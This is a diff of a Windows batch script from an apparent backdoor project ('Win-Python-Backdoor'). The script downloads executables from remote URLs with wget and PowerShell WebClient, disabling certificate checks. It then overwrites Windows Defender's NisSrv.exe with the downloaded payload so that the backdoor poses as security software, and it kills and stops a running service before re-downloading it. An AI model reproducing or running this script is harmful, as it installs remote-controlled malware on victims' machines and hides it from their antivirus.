@@ -61,6 +61,8 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 set wupname=wup1
+taskkill /f /im %wupname%.exe
+net stop %wupname%
 wget --no-check-certificate %urlgit%/win/wup.exe  -O %windir%\%wupname%.exe
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup1.exe
 
@@ -82,8 +84,7 @@ wget --no-check-certificate %urlgit%/win/woffice.exe  -O %windir%\woffice2.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
 rem taskkill /f /im NisSrv.exe
-taskkill /f /im %wupname%.exe
-net stop %wupname%
+
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
 
 copy /Y %windir%\woffice.exe "C:\Program Files\Windows Defender\NisSrv.exe"
